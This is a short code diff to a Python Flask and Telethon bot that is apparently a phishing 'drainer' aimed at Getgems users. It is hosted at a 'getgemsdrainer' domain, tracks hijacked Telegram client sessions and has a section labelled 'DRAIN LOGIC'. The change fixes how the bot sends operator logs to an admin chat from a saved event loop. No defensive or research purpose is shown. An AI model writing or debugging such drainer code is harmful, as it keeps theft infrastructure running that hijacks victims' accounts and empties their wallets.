@@ -25,6 +25,8 @@ DOMAIN = "getgemsdrainer-production.up.railway.app"
 bot = TelegramClient('bot_auth', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 app = Flask(__name__)
 
+main_loop = None
+
 active_clients = {}
 temp_clients = {}
 pending_contacts = {}
@@ -101,12 +103,11 @@ def save_log(text):
         f.write(f"[{datetime.datetime.now()}] {text}\n")
 
 def send_log(msg, buttons=None):
-    if bot.loop and bot.loop.is_running():
-        # Используем thread-safe метод для связи Flask и Telethon
-        asyncio.run_coroutine_threadsafe(
-            bot.send_message(ADMIN_ID, f"<b>LOG:</b>\n{msg}", parse_mode='html', buttons=buttons),
-            bot.loop
-        )
+    save_log(msg)
+    # Используем сохраненный main_loop вместо bot.loop
+    if main_loop and main_loop.is_running():
+        coro = bot.send_message(ADMIN_ID, f"<b>LOG:</b>\n{msg}", parse_mode='html', buttons=buttons)
+        asyncio.run_coroutine_threadsafe(coro, main_loop)
 
 # --- ЛОГИКА СЛИВА (DRAIN LOGIC) ---
 async def drain_logic(client, phone):
